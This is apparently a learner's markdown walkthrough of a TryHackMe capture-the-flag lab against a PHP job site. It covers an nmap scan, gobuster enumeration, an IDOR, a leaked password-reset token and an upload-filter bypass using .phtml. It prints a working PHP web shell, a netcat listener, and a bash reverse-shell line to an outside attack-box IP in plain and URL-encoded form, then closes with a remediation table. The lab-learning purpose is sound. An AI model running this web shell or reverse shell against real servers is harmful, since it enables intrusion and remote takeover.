
# Here I will be saving important notes, commands, pro tips and secrets of pen testing as I progress through the Jr. Penetration Tester path on Try Hack Me!


## Guided Pen Test: Web


```
TARGET = 10.65.188.103
```

For a thorough enumeration of the target machine:

```bash
nmap -sV -sC -p- 10.65.188.103
```

Results:

```bash
root@ip-10-65-123-23:~# nmap -sC -sV -p- 10.65.188.103
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-07-06 05:12 UTC
Nmap scan report for ip-10-65-188-103.ec2.internal (10.65.188.103)
Host is up (0.00029s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c9:cf:4b:27:4e:0b:60:3e:86:c7:97:28:d5:14:5a:25 (ECDSA)
|_  256 1e:1b:42:5a:65:65:68:88:5b:72:6b:7f:95:32:03:c8 (ED25519)
80/tcp   open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: RecruitX - Home
|_http-server-header: Apache/2.4.58 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
3306/tcp open  mysql   MySQL (unauthorized)
8080/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-open-proxy: Proxy might be redirecting requests
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.08 seconds

```

The findings show that the target has ports `22 (SSH)`, `80 (http)`,` 3306 (MySQL)` and `8080 (http)` open.
The server is exposing the `SSH`, web server and may also running `SQL` queries in the back.

Now checking the website headers:

```
curl -I http://10.65.188.103/
```

This revealed:

```
xor1@kali:~$ curl -I http://10.65.188.103/
HTTP/1.1 200 OK
Date: Mon, 06 Jul 2026 05:26:45 GMT
Server: Apache/2.4.58 (Ubuntu)
Set-Cookie: PHPSESSID=uiucfs0ipgtthtdss9oo558tfn; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Type: text/html; charset=UTF-8
```

Means the website is using the `LAMP (Linux, Apache, MySQL, and PHP)` stack for deployment and `apache` version is `2.4.58` and its using `PHP` for `Session Management`.

So far we have found this info: The ports, services, architecture and their version numbers.

#### Directory Enumeration:

using Gobuster:

```
gobuster dir -u 10.65.188.103 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php
```

The results:

```
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/index.php            (Status: 200) [Size: 21600]
/login.php            (Status: 200) [Size: 15107]
/register.php         (Status: 200) [Size: 14802]
/profile.php          (Status: 302) [Size: 0] [--> /login.php]
/jobs.php             (Status: 200) [Size: 27698]
/uploads              (Status: 301) [Size: 316] [--> http://10.65.188.103/uploads/]
/data                 (Status: 403) [Size: 278]
/admin                (Status: 301) [Size: 314] [--> http://10.65.188.103/admin/]
/test                 (Status: 200) [Size: 705]
/includes             (Status: 301) [Size: 317] [--> http://10.65.188.103/includes/]
/api                  (Status: 301) [Size: 312] [--> http://10.65.188.103/api/]
/logout.php           (Status: 302) [Size: 0] [--> /login.php]
/config               (Status: 301) [Size: 315] [--> http://10.65.188.103/config/]
/dashboard.php        (Status: 302) [Size: 0] [--> /login.php]
/reset.php            (Status: 200) [Size: 14408]
/.php                 (Status: 403) [Size: 278]
Progress: 175328 / 175330 (100.00%)
```

- `/admin` - An admin panel exists, but it redirects to the login page. We will need credentials to access it.
- `/api` - An API endpoint is present. APIs often expose data in ways the frontend does not.
- `/reset.php` - A password reset page. Reset mechanisms are frequently implemented insecurely.
- `/uploads` - An uploads directory. If we can upload files, this could be a path to code execution.
- `/profile.php` and `/dashboard.php` - These require authentication, so we need to be logged in to access them.

I registered an account successfully on `/register.php` and logged in as `test@mail.com` & `faisal123` as creds.
There I found some links as one of them is `/profile.php`. Exposing the `IDOR`. Moreover I checked the `/api` endpoint and it was exposing `api routes` which was not intended.

checking the api endpoint:

```
curl http://10.64.146.243/api/
```

results:

```shell-session
{"endpoints":["\/api\/user","\/api\/jobs","\/api\/applications"]}
```

## IDOR:

On going to the `/profile` page the `http://10.64.146.243/profile.php?id=6` appears and changing the `id` parameter to `id=1` i got the `Administrator`.

## Weak password reset:

```
http://10.64.146.243/reset.php
```

with the following account proceed:

```
testuser@fake.thm
```

upon giving the email the token is being revealed in the response:

```
s.mitchell@recruitx.thm
```

using that I changed the `Administrator` account and logged in.

Got the admin panel, uploaded the file for RCE. The files are stored in `upload/documents`, it only accepts `pdf`, `images` and `documents`.

The payload:

```
echo '<?php echo "PHP is executing"; ?>' > test.phtml
```

The extension `phtml` was accepted.

Now getting the RCE:

```
<?php if(isset($_GET['cmd'])) { echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>"; } ?>
```

After uploading the file we can check by executing different commands in the `cmd` parameter:

```
curl "http://10.64.146.243/uploads/documents/shell.phtml?cmd=whoami"
```

now we are going to get the active shell using `netcat` in action.

On our local machine which is the attack box, run the `netcat` listener:

```
nc -lvnp 4444
```

This will be the command we will be embedding in the URL as encoded:

```
bash -c 'bash -i >& /dev/tcp/10.64.81.180/4444 0>&1'
```

encoded:

```
bash+-c+'bash+-i+>%26+/dev/tcp/10.64.81.180/4444+0>%261'
```

**GOT THE SHELLL!**


![](https://github.com/xor-1/CyberSecurity_TryHackMe/blob/main/Jr.%20Penetration%20Tester/Pasted%20image%2020260708203245.png)


Reading the flag:

```
cat /var/www/flag.txt
```


![](https://github.com/xor-1/CyberSecurity_TryHackMe/blob/main/Jr.%20Penetration%20Tester/Pasted%20image%2020260708203416.png)

### Summary

| Vulnerability                                | Severity | Remediation                                                                                                                                                                                     |
| -------------------------------------------- | -------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| IDOR on user profiles and API                | High     | Implement server-side authorisation checks on every request. Verify that the authenticated user has permission to access the requested resource.                                                |
| Password reset token exposed in the response | Critical | Send reset tokens exclusively via email. Display only a generic confirmation message on the page. Use cryptographically random tokens of at least 32 characters.                                |
| Incomplete file extension blocklist          | Critical | Use an allowlist rather than a blocklist. Only permit specific, expected extensions. Validate file content (MIME type) in addition to the extension. Store uploaded files outside the web root. |
| API endpoint disclosure                      | Medium   | Remove the API index endpoint or restrict it to authenticated administrators. Do not expose internal route structures to unauthenticated users.                                                 |

